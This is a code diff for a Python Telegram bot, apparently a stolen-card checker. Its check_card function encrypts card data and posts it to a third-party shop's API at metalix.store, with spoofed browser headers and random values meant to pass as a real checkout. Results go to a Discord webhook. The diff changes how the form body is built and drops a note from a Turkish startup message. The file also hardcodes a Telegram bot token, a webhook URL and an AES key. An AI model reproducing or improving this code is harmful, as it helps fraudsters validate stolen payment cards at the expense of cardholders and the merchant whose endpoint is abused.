@@ -10,7 +10,6 @@ import base64
 import random
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import uuid
 
 BOT_TOKEN = "7411770517:AAGW65ZViNLVCFKFDUM5X-QM15rlxckIb2M"
 WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
@@ -31,6 +30,7 @@ def send_to_webhook(content, webhook_url):
 def check_card(card):
     try:
         AES_KEY = b"eonxsIYALqWz3nFG"
+
         random_hex_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))
         combined = f"{random_hex_value}:{card}"
 
@@ -42,31 +42,21 @@ def check_card(card):
         verification_value = ''.join(random.choice('0123456789abcdef') for _ in range(3000))
         coco_value = str((random.randint(100000000, 9999999999) + random.randint(100000000, 9999999999)) * 31)
 
-        boundary = uuid.uuid4().hex
-
         headers = {
             'accept': '*/*',
-            'content-type': f'multipart/form-data; boundary=----WebKitFormBoundary{boundary}',
             'origin': 'https://metalix.store',
             'referer': 'https://metalix.store/',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
             'x-coco': coco_value
         }
 
-        payload = (
-            f'------WebKitFormBoundary{boundary}\\r\\n'
-            f'Content-Disposition: form-data; name="card"\\r\\n\\r\\n'
-            f'{encrypted_card}\\r\\n'
-            f'------WebKitFormBoundary{boundary}\\r\\n'
-            f'Content-Disposition: form-data; name="{verification_key}"\\r\\n\\r\\n'
-            f'{verification_value}\\r\\n'
-            f'------WebKitFormBoundary{boundary}\\r\\n'
-            f'Content-Disposition: form-data; name="coco"\\r\\n\\r\\n'
-            f'{coco_value}\\r\\n'
-            f'------WebKitFormBoundary{boundary}--\\r\\n'
-        )
+        files = {
+            'card': (None, encrypted_card),
+            verification_key: (None, verification_value),
+            'coco': (None, coco_value)
+        }
 
-        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, data=payload.encode(), timeout=20)
+        response = requests.post("https://metalix.store/api/uts/api.php", headers=headers, files=files, timeout=20)
 
         if response.status_code == 200:
             decrypted_data = AES.new(AES_KEY, AES.MODE_ECB).decrypt(base64.b64decode(response.text.strip()))
@@ -247,6 +237,7 @@ def unban_user(message):
 
 
 if __name__ == "__main__":
-    print("✅ Bot başlatılıyor... Sadece bir örneği çalıştırın!")
+    print("✅ Bot başlatılıyor...")
     bot.remove_webhook()
     bot.infinity_polling()
+
